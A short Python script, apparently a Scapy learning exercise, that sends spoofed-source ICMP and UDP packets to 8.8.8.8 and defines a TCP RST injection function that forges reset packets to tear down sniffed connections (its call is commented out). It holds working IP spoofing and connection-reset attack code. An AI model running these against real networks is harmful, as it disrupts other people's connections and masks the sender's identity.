from scapy.all import *
import threading
import subprocess

def send_forged_icmp():
    packet = IP(src="1.2.3.4", dst="8.8.8.8") / ICMP()
    reply = send(packet)

def send_forged_udp(forged_ip, target_ip, message):
    packet = IP(src=forged_ip, dst=target_ip) / UDP(dport=9999) / Raw(load=message.encode('utf-8'))
    send(packet, verbose=False)

def print_packet(packet):
    print(packet[UDP].dport)

def print_packet(packet):
    if TCP in packet:
        sniffed_packet = {
            "SRC": packet[IP].src,
            "DST": packet[IP].dst,
            "SPORT": packet[TCP].sport,
            "DPORT": packet[TCP].dport,
            "SEQ": packet[TCP].seq
        }
        print(sniffed_packet)

def tcp_rst_injection_attack(packet):
    sniffed_packet = {
        "SRC": packet[IP].src,
        "DST": packet[IP].dst,
        "SPORT": packet[TCP].sport,
        "DPORT": packet[TCP].dport,
        "SEQ": packet[TCP].seq
    }
    print(f"Sniffed packet: {sniffed_packet}")

    forged_packet = IP(src=sniffed_packet["DST"], dst=sniffed_packet["SRC"]) / TCP(sport=sniffed_packet["DPORT"], dport=sniffed_packet["SPORT"], flags="R", seq=sniffed_packet["SEQ"])
    print(f"Forged packet: {forged_packet}")

    send(forged_packet)

def main():
    thread = threading.Thread(target=sniff, kwargs={"prn": print_packet, "iface":"eth0", "timeout":3, "count":10, "lfilter": lambda p: UDP in p})
    thread.start()
    time.sleep(1.0)
    send_forged_udp("1.2.3.4", "8.8.8.8", "herro")
    thread.join()

    # thread = threading.Thread(target=sniff, kwargs={"prn": tcp_rst_injection_attack, "iface":"eth0", "timeout":3, "count":1, "lfilter": lambda p: TCP in p})
    # thread.start()
    # time.sleep(1.0)
    # subprocess.run(["curl", "http://example.com"], capture_output=True)
    # thread.join()


if __name__ == "__main__":
    main()